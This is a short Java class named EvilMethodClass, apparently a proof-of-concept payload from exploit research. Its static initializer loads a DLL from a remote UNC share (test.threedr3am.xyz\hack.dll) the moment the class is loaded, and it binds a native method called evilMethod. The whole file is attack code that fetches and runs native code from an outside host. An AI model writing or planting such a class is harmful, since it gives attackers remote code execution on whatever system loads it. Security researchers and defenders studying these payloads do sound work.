/**
 * @author xuanyh
 */
public class EvilMethodClass {

  static {
    System.load("\\\\test.threedr3am.xyz\\\\hack.dll");
  }

  //声明一个native方法
  public static native String evilMethod(String name);
}
